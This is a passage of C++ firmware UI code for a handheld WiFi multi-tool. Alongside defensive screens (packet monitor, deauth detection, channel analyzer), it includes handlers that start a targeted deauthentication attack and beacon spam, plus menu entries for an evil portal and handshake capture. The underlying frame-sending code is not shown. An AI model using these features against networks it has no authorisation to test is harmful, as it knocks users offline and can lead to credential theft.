  displayShowMessage("Handshake Result", msg.c_str());
}

void wifiHandleHandshakeResultEvent(int evt) {
  (void)evt;
  enterState(STATE_WIFI_MENU);
}

// ====================================================================
//  UI – WiFi Menu (updated with Handshake Capture)
// ====================================================================
static SimpleMenu wifiMenu({"Scan", "Signal strength", "Packet Monitor", "Deauth Detect", "Deauth", "Beacon Spam",
                             "Channel Analyzer", "Sniffer", "Connect (saved)", "Scan Hosts", "Evil Portal",
                             "Handshake Capture"});

void wifiEnterMenu() {
  displayShowMenu("WiFi", wifiMenu.items(), wifiMenu.index());
}

void wifiHandleMenuEvent(int evt) {
  if (evt == EVT_UP)   { wifiMenu.up();   wifiEnterMenu(); }
  if (evt == EVT_DOWN) { wifiMenu.down(); wifiEnterMenu(); }
  if (evt == EVT_OK) {
    switch (wifiMenu.index()) {
      case 0:  enterState(STATE_WIFI_SCAN);            break;
      case 1:  enterState(STATE_WIFI_METER);           break;
      case 2:  enterState(STATE_WIFI_PACKET_MON);      break;
      case 3:  enterState(STATE_WIFI_DEAUTH);          break;
      case 4:  enterState(STATE_WIFI_DEAUTH_PICK);     break;
      case 5:  enterState(STATE_WIFI_BEACON_PICK);     break;
      case 6:  enterState(STATE_WIFI_CHANNEL_ANALYZER); break;
      case 7:  enterState(STATE_WIFI_SNIFFER);         break;
      case 8:  enterState(STATE_WIFI_CONNECT);         break;
      case 9:  enterState(STATE_WIFI_SCANHOSTS);       break;
      case 10: enterState(STATE_WIFI_EVIL_PORTAL);     break;
      case 11: enterState(STATE_WIFI_HANDSHAKE_MENU);  break;
    }
  }
}

// ====================================================================
//  WiFi Scan UI (unchanged)
// ====================================================================
enum WifiScanUiPhase { WIFI_SCAN_RADAR, WIFI_SCAN_LIST };
static WifiScanUiPhase wifiScanPhase = WIFI_SCAN_RADAR;
static std::vector<WifiNet> wifiScanResults;
static ScrollList wifiScanList;
static unsigned long lastWifiScanAnimFrame = 0;
static int wifiScanRetries = 0;
static const int WIFI_SCAN_MAX_RETRIES = 5;

static void drawWifiScanRadar() {
  beginScreen("WiFi Scan", UI_ACCENT_CYAN);
  int cx = tft.width() / 2;
  int top = displayHeaderHeight();
  int cy = top + (tft.height() - top) / 2;
  int r = min((int)tft.width(), (int)tft.height() - top) / 2 - 16;
  if (r < 20) r = 20;
  tft.drawCircle(cx, cy, r, displayColorFgDim());
  tft.drawCircle(cx, cy, r * 2 / 3, displayColorFgDim());
  tft.drawCircle(cx, cy, r / 3, displayColorFgDim());
  float angle = (millis() % 2000) / 2000.0f * 2.0f * PI;
  int ex = cx + (int)(r * cosf(angle));
  int ey = cy + (int)(r * sinf(angle));
  tft.drawLine(cx, cy, ex, ey, UI_ACCENT_CYAN);
  for (int i = 1; i <= 4; i++) {
    float trailAngle = angle - i * 0.12f;
    int tx = cx + (int)(r * cosf(trailAngle));
    int ty = cy + (int)(r * sinf(trailAngle));
    tft.drawLine(cx, cy, tx, ty, displayColorFgDim());
  }
  drawFooter("Scanning...");
}

void wifiEnterScan() {
  wifiScanPhase = WIFI_SCAN_RADAR;
  wifiScanResults.clear();
  wifiScanList.reset();
  lastWifiScanAnimFrame = 0;
  wifiScanRetries = 0;
  wifiScanStart();
  drawWifiScanRadar();
}

void wifiHandleScanEvent(int evt) {
  if (wifiScanPhase == WIFI_SCAN_RADAR) {
    if (wifiScanHasFailed()) {
      if (wifiScanRetries < WIFI_SCAN_MAX_RETRIES) {
        wifiScanRetries++;
        wifiScanStart();
      } else {
        wifiScanResults.clear();
        wifiScanPhase = WIFI_SCAN_LIST;
        wifiScanList.reset();
        drawNetworkListScreen("WiFi Scan", wifiScanList, wifiScanResults, "UP/DN move   OK rescan   BACK exit");
      }
    } else if (wifiScanIsComplete()) {
      wifiScanResults = wifiScanFinish();
      wifiScanPhase = WIFI_SCAN_LIST;
      wifiScanList.reset();
      drawNetworkListScreen("WiFi Scan", wifiScanList, wifiScanResults, "UP/DN move   OK rescan   BACK exit");
    } else {
      unsigned long now = millis();
      if (now - lastWifiScanAnimFrame > 60) {
        lastWifiScanAnimFrame = now;
        drawWifiScanRadar();
      }
    }
    return;
  }

  const char* footer = "UP/DN move   OK rescan   BACK exit";
  if (evt == EVT_OK) {
    enterState(STATE_WIFI_SCAN);
  } else if (evt == EVT_UP) {
    wifiScanList.up();
    drawNetworkListScreen("WiFi Scan", wifiScanList, wifiScanResults, footer);
  } else if (evt == EVT_DOWN) {
    wifiScanList.down((int)wifiScanResults.size());
    drawNetworkListScreen("WiFi Scan", wifiScanList, wifiScanResults, footer);
  }
}

// ---- Signal Meter (unchanged) ----
static RedrawTimer wifiMeterRedraw;
static ScrollList wifiMeterList;
static std::vector<WifiNet> meterNets; 

static void drawWifiMeter() {
  // Re-scan only if the list is empty or on refresh
  if (meterNets.empty() || wifiMeterRedraw.due(0)) {
    meterNets = wifiScanRaw();
  }

  beginScreen("Signal Meter", UI_ACCENT_CYAN);
  int top = displayHeaderHeight() + 4;
  const int footerH = 14;
  const int rowH = 18;

  if (meterNets.empty()) {
    tft.setCursor(8, top);
    tft.print("No networks found");
    drawFooter("OK rescan  BACK exit");
    return;
  }

  int visibleRows = scrollVisibleRows(top, footerH, rowH);
  int scrollbarW = scrollbarWidthFor((int)meterNets.size(), visibleRows);
  int listWidth = tft.width() - scrollbarW;

  drawScrollListBody(wifiMeterList, (int)meterNets.size(), top, footerH, rowH, /*selectable=*/true,
    [&](int i, int y, bool selected) {
      const WifiNet& n = meterNets[i];
      if (selected) {
        tft.fillRect(0, y - 2, listWidth, rowH, displayColorSelectBg());
        tft.setTextColor(displayColorSelectFg(), displayColorSelectBg());
      } else {
        tft.setTextColor(displayColorFg(), displayColorBg());
      }
      tft.setTextSize(1);

      // SSID
      int maxSsid = (listWidth - 90) / 6;
      String ssid = elideToWidth(n.ssid, maxSsid);
      tft.setCursor(8, y);
      tft.print(ssid);

      // RSSI value, colored to match the bar next to it.
      if (!selected) tft.setTextColor(wifiRssiColor(n.rssi), displayColorBg());
      String rssiStr = String(n.rssi) + "dBm";
      tft.setCursor(listWidth - 80, y);
      tft.print(rssiStr);
      if (!selected) tft.setTextColor(displayColorFg(), displayColorBg());

      // Signal bar
      int pct = constrain(map(n.rssi, -90, -30, 5, 100), 5, 100);
      int barX = listWidth - 70;
      int barW = 40;
      int barH = 10;
      tft.fillRect(barX, y + 3, barW * pct / 100, barH, wifiRssiColor(n.rssi));
      tft.drawRect(barX, y + 3, barW, barH, displayColorFgDim());
    });

  drawFooter("OK rescan  UP/DN scroll  BACK exit");
}

void wifiEnterMeter() {
  wifiMeterRedraw.reset();
  wifiMeterList.reset();
  meterNets = wifiScanRaw(); // initial scan
  drawWifiMeter();
}

void wifiHandleMeterEvent(int evt) {
  if (evt == EVT_OK) {
    meterNets = wifiScanRaw();
    wifiMeterList.reset();
    drawWifiMeter();
  } else if (evt == EVT_UP) {
    wifiMeterList.up();
    drawWifiMeter();
  } else if (evt == EVT_DOWN) {
    wifiMeterList.down((int)meterNets.size());
    drawWifiMeter();
  }
  // Auto-refresh every 4s
  if (wifiMeterRedraw.due(4000)) {
    meterNets = wifiScanRaw();
    drawWifiMeter();
  }
}

// ---- Packet Monitor (unchanged) ----


static int pmTop, pmGridY, pmGridW, pmRowH, pmWfX, pmWfY, pmWfW, pmWfH, pmColW;

struct PmStatCell { const char* label; uint32_t value; bool alert; };
static const char* const PM_STAT_LABELS[8] = {
  "MGMT", "CTRL", "DATA", "BEACON", "PROBE-REQ", "PROBE-RSP", "DEAUTH", "DISASSOC"
};

static void drawPmStatGridChrome(int x, int y, int w, int rowH, int count, int cols) {
  int colW = w / cols;
  for (int i = 0; i < count; i++) {
    int col = i % cols;
    int row = i / cols;
    int cx = x + col * colW;
    int cy = y + row * rowH;
    tft.drawRect(cx, cy, colW - 2, rowH - 2, displayColorFgDim());
    tft.setTextSize(1);
    tft.setTextColor(displayColorFgDim(), displayColorBg());
    tft.setCursor(cx + 4, cy + 3);
    tft.print(PM_STAT_LABELS[i]);
  }
}

static void drawPmStatGridValues(int x, int y, int w, int rowH, const PmStatCell* cells, int count, int cols) {
  int colW = w / cols;
  for (int i = 0; i < count; i++) {
    int col = i % cols;
    int row = i / cols;
    int cx = x + col * colW;
    int cy = y + row * rowH;
    tft.fillRect(cx + 2, cy + 11, colW - 6, 10, displayColorBg());
    tft.setTextSize(1);
    tft.setTextColor(cells[i].alert ? UI_ACCENT_RED : displayColorFg(), displayColorBg());
    tft.setCursor(cx + 4, cy + 13);
    tft.print(String(cells[i].value));
  }
}

static void drawPacketMonitorScreen() {
  beginScreen("Packet Monitor", UI_ACCENT_PURPLE);
  int top = displayHeaderHeight() + 2;

  // ---- Stats header ----
  WifiPacketCounts c = wifiGetPacketCounts();
  tft.setTextSize(1);
  tft.setTextColor(displayColorFg(), displayColorBg());
  tft.setCursor(8, top);
  tft.print("MGMT:" + String(c.mgmt) + " CTRL:" + String(c.ctrl) + " DATA:" + String(c.data));
  top += 18;
  tft.setCursor(8, top);
  tft.print("Beacon:" + String(c.beacon) + " PrReq:" + String(c.probeReq) + " PrRsp:" + String(c.probeResp));
  top += 18;
  // Deauth/disassoc counts are attack indicators, so they get the danger
  // accent while the live packet rate gets the info accent - both stand
  // out from the plain MGMT/CTRL/DATA tallies above.
  tft.setCursor(8, top);
  tft.print("Deauth:");
  tft.setTextColor(UI_ACCENT_RED, displayColorBg());
  tft.print(String(c.deauth) + " ");
  tft.setTextColor(displayColorFg(), displayColorBg());
  tft.print("Disassoc:");
  tft.setTextColor(UI_ACCENT_RED, displayColorBg());
  tft.print(String(c.disassoc) + "  ");
  tft.setTextColor(displayColorFg(), displayColorBg());
  tft.print("Pkt/s:");
  tft.setTextColor(UI_ACCENT_CYAN, displayColorBg());
  tft.print(String(pmLastPktPerSec));
  tft.setTextColor(displayColorFg(), displayColorBg());
  top += 24;

  // ---- Waterfall area with box ----
  int margin = 6;
  int wfW = tft.width() - 2 * margin - 14; // leave space for channel labels
  int wfH = tft.height() - top - margin - 18; // bottom margin for footer
  int rowH = wfH / 13;
  if (rowH < 2) rowH = 2;
  int colW = wfW / PM_WATERFALL_COLS;
  if (colW < 1) colW = 1;

  // Draw a border around the waterfall
  int boxX = margin + 12; // offset for channel labels
  int boxY = top;
  int boxW = wfW;
  int boxH = rowH * 13;
  tft.drawRect(boxX - 1, boxY - 1, boxW + 2, boxH + 2, displayColorFgDim());

  // Draw waterfall cells
  for (int ch = 0; ch < 13; ch++) {
    int y = boxY + ch * rowH;
    for (int col = 0; col < PM_WATERFALL_COLS; col++) {
      uint8_t val = pmWaterfall[ch][col];
      uint16_t color;
      // Map 0-255 to visible gradient: dark grey -> green -> amber -> red
      if (val < 10) color = TFT_DARKGREY;           // near zero
      else if (val < 60) color = tft.color565(0, 60, 0); // dark green
      else if (val < 120) color = UI_ACCENT_GREEN;
      else if (val < 200) color = UI_ACCENT_AMBER;
      else color = UI_ACCENT_RED;
      tft.fillRect(boxX + col * colW, y, colW, rowH, color);
    }
  }

  // ---- Channel labels (on the left of the box) ----
  for (int ch = 0; ch < 13; ch++) {
    int y = boxY + ch * rowH + (rowH - 6) / 2;
    tft.setTextColor(displayColorFg(), displayColorBg());
    tft.setTextSize(1);
    tft.setCursor(margin, y);
    tft.print(String(ch + 1));
  }

  drawFooter("OK reset  BACK exit");
}

void wifiEnterPacketMonitor() {
  wifiStartPacketMonitor();
  pmChannelNav.begin(wifiPacketMonitorSetChannel, wifiPacketMonitorHopChannel, wifiPacketMonitorGetChannel);
  memset(pmWaterfall, 0, sizeof(pmWaterfall));
  memset(pmChanCounts, 0, sizeof(pmChanCounts));
  pmLastTotalFrames = 0;
  pmLastPktPerSec = 0;
  pmRedraw.reset();
  drawPacketMonitorScreen();
}


void wifiHandlePacketMonitorEvent(int evt) {
  pmChannelNav.handleEvent(evt);
  pmChannelNav.tick(300);
  if (evt == EVT_OK) {
    wifiResetPacketCounts();
    memset(pmWaterfall, 0, sizeof(pmWaterfall));
    memset(pmChanCounts, 0, sizeof(pmChanCounts));
    pmLastTotalFrames = 0;
    pmLastPktPerSec = 0;
    drawPacketMonitorScreen();
  }
  if (pmRedraw.due(500)) {
    WifiPacketCounts c = wifiGetPacketCounts();
    uint32_t total = c.mgmt + c.ctrl + c.data;
    uint32_t delta = (total >= pmLastTotalFrames) ? (total - pmLastTotalFrames) : total;
    pmLastTotalFrames = total;
    pmLastPktPerSec = delta * 2;
    updateWaterfall();
    drawPacketMonitorScreen();
  }
}

// ---- Deauth Detect (unchanged) ----
static ChannelNav ddChannelNav;
static RedrawTimer ddRedraw;

static void drawDeauthScreen() {
  uint32_t count = wifiGetDeauthCount();
  bool alert = count > 20;
  const uint16_t accent = alert ? UI_ACCENT_RED : UI_ACCENT_AMBER;
  beginScreen("Deauth Detect", accent, /*pulse=*/alert);
  // Pill gets its own row just under the header, so it never collides
  // with the text lines below regardless of screen width.
  drawStatusPill(tft.width() - 8, displayHeaderHeight() + 4, alert ? "ALERT" : "MONITORING", accent, /*pulse=*/alert);
  tft.setCursor(8, displayHeaderHeight() + 24);
  tft.print("Deauth/disassoc frames: " + String(count));
  tft.setCursor(8, displayHeaderHeight() + 44);
  tft.print("CH " + String(wifiPacketMonitorGetChannel()) + ddChannelNav.label());
  if (alert) {
    tft.setTextColor(UI_ACCENT_RED, displayColorBg());
    tft.setCursor(8, displayHeaderHeight() + 68);
    tft.print("Possible attack");
    tft.setTextColor(displayColorFg(), displayColorBg());
  }
  drawFooter("OK reset  LEFT/RIGHT ch  UP auto  BACK exit");
}

void wifiEnterDeauthDetect() {
  wifiStartPacketMonitor();
  ddChannelNav.begin(wifiPacketMonitorSetChannel, wifiPacketMonitorHopChannel, wifiPacketMonitorGetChannel);
  ddRedraw.reset();
  drawDeauthScreen();
}

void wifiHandleDeauthDetectEvent(int evt) {
  ddChannelNav.handleEvent(evt);
  ddChannelNav.tick(300);
  if (evt == EVT_OK) wifiResetPacketCounts();
  if (ddRedraw.due(500)) drawDeauthScreen();
}

// ---- Deauth target pick & run (unchanged) ----
static std::vector<WifiNet> deauthPickResults;
static ScrollList deauthPickList;
static String deauthPickSsid = "";
static String deauthPickBssid = "";
static uint8_t deauthPickChannel = 1;
static RedrawTimer deauthRunRedraw;

void wifiEnterDeauthPick() {
  deauthPickResults = wifiScanRaw();
  deauthPickList.reset();
  drawNetworkListScreen("Deauth Target", deauthPickList, deauthPickResults, "UP/DN select   OK start   BACK exit");
}

void wifiHandleDeauthPickEvent(int evt) {
  const char* footer = "UP/DN select   OK start   BACK exit";
  if (evt == EVT_UP) {
    deauthPickList.up();
    drawNetworkListScreen("Deauth Target", deauthPickList, deauthPickResults, footer);
  } else if (evt == EVT_DOWN) {
    deauthPickList.down((int)deauthPickResults.size());
    drawNetworkListScreen("Deauth Target", deauthPickList, deauthPickResults, footer);
  } else if (evt == EVT_OK) {
    int i = deauthPickList.selRow;
    if (i >= 0 && i < (int)deauthPickResults.size()) {
      const WifiNet& n = deauthPickResults[i];
      deauthPickSsid = n.ssid;
      deauthPickBssid = n.bssid;
      deauthPickChannel = n.channel;
      enterState(STATE_WIFI_DEAUTH_RUN);
    }
  }
}

static void drawDeauthRunScreen() {
  bool running = wifiDeauthIsRunning();
  const uint16_t accent = running ? UI_ACCENT_RED : UI_ACCENT_AMBER;
  beginScreen("Deauth Attack", accent, /*pulse=*/running);
  int y = displayHeaderHeight() + 24;
  // Pill gets its own row just under the header, so it never collides
  // with the Target/BSSID text lines below.
  drawStatusPill(tft.width() - 8, displayHeaderHeight() + 4, running ? "SENDING" : "STOPPED", accent, /*pulse=*/running);
  tft.setCursor(8, y);
  tft.print("Target: " + deauthPickSsid);
  y += 16;
  tft.setCursor(8, y);
  tft.print("BSSID: " + deauthPickBssid);
  y += 16;
  tft.setTextColor(UI_ACCENT_AMBER, displayColorBg());
  tft.setCursor(8, y);
  tft.print("Frames sent: " + String(wifiDeauthFramesSent()));
  tft.setTextColor(displayColorFg(), displayColorBg());
  y += 24;
  tft.setTextColor(accent, displayColorBg());
  tft.setCursor(8, y);
  tft.print(running ? "Sending... (OK to stop)" : "Stopped (OK to resume)");
  tft.setTextColor(displayColorFg(), displayColorBg());
  drawFooter("BACK to stop and exit");
}

void wifiEnterDeauthRun() {
  wifiDeauthSetTarget(deauthPickSsid, deauthPickBssid, deauthPickChannel);
  wifiDeauthStart();
  deauthRunRedraw.reset();
  drawDeauthRunScreen();
}

void wifiHandleDeauthRunEvent(int evt) {
  if (evt == EVT_OK) {
    if (wifiDeauthIsRunning()) wifiDeauthStop();
    else wifiDeauthStart();
    drawDeauthRunScreen();
  }
  wifiDeauthTick();
  if (deauthRunRedraw.due(500)) drawDeauthRunScreen();
}

// ---- Beacon Pick / Run (unchanged) ----
static uint8_t beaconPickChannelUI = 1;
static RedrawTimer beaconRunRedraw;

static void drawBeaconPickScreen() {
  beginScreen("Beacon Spam", UI_ACCENT_PURPLE);
  int y = displayHeaderHeight() + 12;
  tft.setTextColor(UI_ACCENT_PURPLE, displayColorBg());
  tft.setCursor(8, y);
  tft.print("Channel: " + String(beaconPickChannelUI));
  tft.setTextColor(displayColorFg(), displayColorBg());
  y += 24;
  tft.setTextColor(displayColorFgDim(), displayColorBg());
  tft.setCursor(8, y);
  tft.print("Sends fake APs with random SSIDs");
  y += 16;
  tft.setCursor(8, y);
  tft.print("on selected channel (~250/sec)");
  y += 24;
  tft.setTextColor(displayColorFg(), displayColorBg());
  tft.setCursor(8, y);
  tft.print("LEFT/RIGHT: change channel");
  drawFooter("OK: start  |  BACK: exit");
}

void wifiEnterBeaconPick() {
  beaconPickChannelUI = 1;
  drawBeaconPickScreen();
}

void wifiHandleBeaconPickEvent(int evt) {
  if (evt == EVT_LEFT) {
    beaconPickChannelUI = (beaconPickChannelUI <= 1) ? 13 : beaconPickChannelUI - 1;
    drawBeaconPickScreen();
  } else if (evt == EVT_RIGHT) {
    beaconPickChannelUI = (beaconPickChannelUI >= 13) ? 1 : beaconPickChannelUI + 1;
    drawBeaconPickScreen();
  } else if (evt == EVT_OK) {
    enterState(STATE_WIFI_BEACON_RUN);
  }
}

static void drawBeaconRunScreen() {
  clearBody(displayHeaderHeight());
  bool running = wifiBeaconIsRunning();
  const uint16_t accent = running ? UI_ACCENT_RED : UI_ACCENT_AMBER;
  // Pill gets its own row just under the header, so it never collides
  // with the Channel/Frames text lines below.
  drawStatusPill(tft.width() - 8, displayHeaderHeight() + 4, running ? "SPAMMING" : "STOPPED", accent, /*pulse=*/running);
  int y = displayHeaderHeight() + 24;
  tft.setCursor(8, y);
  tft.print("Channel: " + String(wifiBeaconGetChannel()));
  y += 16;
  tft.setTextColor(UI_ACCENT_PURPLE, displayColorBg());
  tft.setCursor(8, y);
  tft.print("Frames sent: " + String(wifiBeaconFramesSent()));
  tft.setTextColor(displayColorFg(), displayColorBg());
  y += 24;
  tft.setTextColor(accent, displayColorBg());
  tft.setCursor(8, y);
  tft.print(running ? "Spamming... (OK to stop)" : "Stopped (OK to resume)");
  tft.setTextColor(displayColorFg(), displayColorBg());
  drawFooter("BACK to stop and exit");
}

void wifiEnterBeaconRun() {
  wifiBeaconSetChannel(beaconPickChannelUI);
  wifiBeaconStart();
  beaconRunRedraw.reset();
  beginScreen("Beacon Spam", UI_ACCENT_RED);
  drawBeaconRunScreen();
}

void wifiHandleBeaconRunEvent(int evt) {
  if (evt == EVT_OK) {
    if (wifiBeaconIsRunning()) wifiBeaconStop();
    else wifiBeaconStart();
    drawBeaconRunScreen();
  }
  wifiBeaconTick();
  if (beaconRunRedraw.due(500)) drawBeaconRunScreen();
}

// ---- Channel Analyzer (unchanged) ----
static RedrawTimer caRedraw;

static void drawChannelAnalyzer() {
  clearBody(displayHeaderHeight());
  int top = displayHeaderHeight() + 12;
  int barAreaH = tft.height() - top - 24;
  int barW = max(6, (tft.width() - 16) / 13 - 2);
  uint16_t maxV = 1;
  for (int ch = 1; ch <= 13; ch++) maxV = max(maxV, wifiChannelAnalyzerGetActivity(ch));
  uint8_t curCh = wifiChannelAnalyzerGetCurrentChannel();
  for (int ch = 1; ch <= 13; ch++) {
    uint16_t v = wifiChannelAnalyzerGetActivity(ch);
    int h = (int)((uint32_t)v * barAreaH / maxV);
    int x = 8 + (ch - 1) * (barW + 2);
    // Bars are colored by how busy the channel is (quiet->green,
    // busy->amber, saturated->red) instead of one flat foreground color.
    float ratio = (float)v / maxV;
    uint16_t barColor = (ratio > 0.66f) ? UI_ACCENT_RED : (ratio > 0.33f) ? UI_ACCENT_AMBER : UI_ACCENT_GREEN;
    tft.fillRect(x, top + (barAreaH - h), barW, h, barColor);
    tft.drawRect(x, top, barW, barAreaH, displayColorFgDim());
    bool isCurrent = (ch == curCh);
    if (isCurrent) tft.fillRect(x, top + barAreaH + 1, barW, 2, wifiUiBreathe(UI_ACCENT_CYAN, 0.003f, 0.65f));
    tft.setTextColor(isCurrent ? UI_ACCENT_CYAN : displayColorFgDim(), displayColorBg());
    tft.setCursor(x, top + barAreaH + 4);
    tft.print(ch);
  }
  drawFooter("Frames/dwell per channel  BACK exit");
}

void wifiEnterChannelAnalyzer() {
  wifiChannelAnalyzerStart();
  caRedraw.reset();
  beginScreen("Channel Analyzer", UI_ACCENT_CYAN);
  drawChannelAnalyzer();
}

void wifiHandleChannelAnalyzerEvent(int evt) {
  wifiChannelAnalyzerTick();
  if (caRedraw.due(300)) drawChannelAnalyzer();
}

// ---- Sniffer (unchanged) ----
static ChannelNav sniffChannelNav;
static RedrawTimer sniffRedraw;

static void drawSnifferScreen() {
  clearBody(displayHeaderHeight());
  int y = displayHeaderHeight() + 12;
  tft.setTextSize(1);
  tft.setTextColor(displayColorFg(), displayColorBg());

  // Channel and hop status
  tft.setCursor(8, y);
  tft.print("CH " + String(wifiSnifferGetChannel()) + sniffChannelNav.label());
  y += 20;

  // Packet rates
  tft.setCursor(8, y);
  tft.print("Mgmt: " + String(snifferMgmt) + "  Ctrl: " + String(snifferCtrl) + "  Data: " + String(snifferData));
  y += 18;

  // Last RSSI, colored by signal strength like every other RSSI reading.
  tft.setCursor(8, y);
  tft.print("Last RSSI: ");
  tft.setTextColor(wifiRssiColor(snifferLastRssi), displayColorBg());
  tft.print(String(snifferLastRssi) + " dBm");
  tft.setTextColor(displayColorFg(), displayColorBg());
  y += 18;

  // Packet rate (packets/sec)
  tft.setCursor(8, y);
  tft.print("Rate: " + String(snifferPktRate) + " pkt/s");
  y += 20;

  // Mini channel activity bar (1-13), colored by how busy each channel
  // is (quiet->green, busy->amber, saturated->red), current channel
  // marked with a cyan underline - same language as Channel Analyzer.
  tft.setTextColor(displayColorFgDim(), displayColorBg());
  tft.setCursor(8, y);
  tft.print("Channel activity:");
  y += 16;
  int barW = (tft.width() - 16) / 13;
  uint8_t curCh = wifiSnifferGetChannel();
  for (int ch = 1; ch <= 13; ch++) {
    uint16_t activity = wifiChannelAnalyzerGetActivity(ch); // reuse channel analyzer
    int h = map(activity, 0, 100, 2, 30);
    float ratio = constrain(activity, 0, 100) / 100.0f;
    uint16_t col = (ratio > 0.66f) ? UI_ACCENT_RED : (ratio > 0.33f) ? UI_ACCENT_AMBER : UI_ACCENT_GREEN;
    int bx = 8 + (ch - 1) * (barW + 2);
    tft.fillRect(bx, y + 30 - h, barW, h, col);
    if (ch == curCh) tft.fillRect(bx, y + 31, barW, 2, wifiUiBreathe(UI_ACCENT_CYAN, 0.003f, 0.65f));
  }

  // Log count
  y += 40;
  tft.setCursor(8, y);
  tft.print("Logged: " + String(wifiSnifferGetLoggedCount()) + "  Dropped: " + String(wifiSnifferGetDroppedCount()));

  drawFooter("LEFT/RIGHT ch  UP auto  BACK exit");
}

void wifiEnterSniffer() {
  wifiSnifferStart();
  sniffChannelNav.begin(wifiSnifferSetChannel, wifiSnifferHopChannel, wifiSnifferGetChannel);
  sniffRedraw.reset();
  // Reset stats
  snifferMgmt = snifferCtrl = snifferData = 0;
  snifferLastRssi = 0;
  snifferPktRate = 0;
  snifferLastUpdate = millis();
  beginScreen("Sniffer", UI_ACCENT_PURPLE);
  drawSnifferScreen();
}

void wifiHandleSnifferEvent(int evt) {
  sniffChannelNav.handleEvent(evt);
  sniffChannelNav.tick(300);
  wifiSnifferTick(); // process and log to SD

  // Update stats every 500ms
  unsigned long now = millis();
  static unsigned long snifferLastUpdate = 0;
  if (now - snifferLastUpdate >= 500) {
    uint32_t total = snifferMgmt + snifferCtrl + snifferData;
    uint32_t delta = total - snifferPrevTotal;
    snifferPktRate = delta * 2; // because 500ms interval
    snifferPrevTotal = total;
    snifferLastUpdate = now;
    drawSnifferScreen();
  }
}

// ---- Connect (saved) (unchanged) ----
static SimpleMenu wifiConnectMenu({});

static void drawWifiConnectMenu() {
  displayShowMenu("Connect (OK=join)", wifiConnectMenu.items(), wifiConnectMenu.index());
}

void wifiEnterConnect() {
  auto names = wifiListSavedNetworks();
  wifiConnectMenu.setItems(names);
  wifiConnectMenu.setIndex(0);
  drawWifiConnectMenu();
}

void wifiHandleConnectEvent(int evt) {
  if (evt == EVT_UP)   { wifiConnectMenu.up();   drawWifiConnectMenu(); }
  if (evt == EVT_DOWN) { wifiConnectMenu.down(); drawWifiConnectMenu(); }
  if (evt == EVT_OK) {
    auto creds = loadSavedCreds();
    int idx = wifiConnectMenu.index();
    if (idx < (int)creds.size()) {
      displayShowMessage("WiFi", ("Connecting to " + creds[idx].ssid + "...").c_str());
      bool ok = wifiConnectSaved(idx);
      String msg = ok ? ("Connected: " + wifiGetLocalIpStr()) : "Failed to connect";
      displayShowMessage("WiFi", msg.c_str());
      delay(1200);
      drawWifiConnectMenu();
    }
  }
}

// ---- Scan Hosts (unchanged) ----
static std::vector<HostHit> scanHostsResults;
static ScrollList scanHostsList;
static bool scanHostsRunning = false;
static bool scanHostsDone = false;

static void drawScanHostsScreen() {
  if (!wifiIsConnected()) {
    beginScreen("Scan Hosts", UI_ACCENT_RED);
    int top = displayHeaderHeight() + 8;
    tft.setTextColor(UI_ACCENT_RED, displayColorBg());
    tft.setCursor(8, top);
    tft.print("Not connected.");
    tft.setTextColor(displayColorFg(), displayColorBg());
    tft.setCursor(8, top + 16);
    tft.print("Use 'Connect (saved)' first.");
    drawFooter("BACK exit");
    return;
  }
  if (scanHostsRunning) {
    beginScreen("Scan Hosts", UI_ACCENT_CYAN);
    int top = displayHeaderHeight() + 8;
    String subnet = WiFi.localIP().toString();
    subnet = subnet.substring(0, subnet.lastIndexOf('.'));
    tft.setCursor(8, top);
    tft.print("Scanning " + subnet + ".0/24 ...");
    tft.setCursor(8, top + 16);
    tft.print("(port 80 TCP connect probe)");
    return;
  }
  if (!scanHostsDone) {
    beginScreen("Scan Hosts", UI_ACCENT_BLUE);
    int top = displayHeaderHeight() + 8;
    tft.setCursor(8, top);
    tft.print("OK = start scan");
    drawFooter("BACK exit");
    return;
  }

  bool found = !scanHostsResults.empty();
  String title = "Hosts found (" + String(scanHostsResults.size()) + ")";
  beginScreen(title.c_str(), found ? UI_ACCENT_GREEN : UI_ACCENT_AMBER);
  int top = displayHeaderHeight() + 8;
  const int footerH = 14;
  const int rowH = 16;
  if (scanHostsResults.empty()) {
    tft.setCursor(8, top);
    tft.print("No hosts responded on :80");
  } else {
    drawScrollListBody(scanHostsList, (int)scanHostsResults.size(), top, footerH, rowH, /*selectable=*/true,
      [&](int i, int y, bool selected) {
        if (selected) {
          tft.fillRect(0, y - 2, tft.width(), rowH, displayColorSelectBg());
          tft.setTextColor(displayColorSelectFg(), displayColorSelectBg());
        } else {
          tft.setTextColor(UI_ACCENT_GREEN, displayColorBg());
        }
        tft.setCursor(8, y);
        tft.print(ipU32ToStr(scanHostsResults[i].ip));
      });
  }
  drawFooter("OK rescan   BACK exit");
}

void wifiEnterScanHosts() {
  scanHostsResults.clear();
  scanHostsRunning = false;
  scanHostsDone = false;
  scanHostsList.reset();
  drawScanHostsScreen();
}

void wifiHandleScanHostsEvent(int evt) {
  if (!wifiIsConnected()) { drawScanHostsScreen(); return; }
  if (evt == EVT_OK && !scanHostsRunning) {
    scanHostsRunning = true;
    scanHostsDone = false;
    drawScanHostsScreen();
    scanHostsResults = wifiScanHosts(80, 300);
    scanHostsRunning = false;
    scanHostsDone = true;
    scanHostsList.reset();
    drawScanHostsScreen();
    return;
  }
  if (scanHostsDone) {
    if (evt == EVT_UP) { scanHostsList.up(); drawScanHostsScreen(); }
    if (evt == EVT_DOWN) { scanHostsList.down((int)scanHostsResults.size()); drawScanHostsScreen(); }
  }
}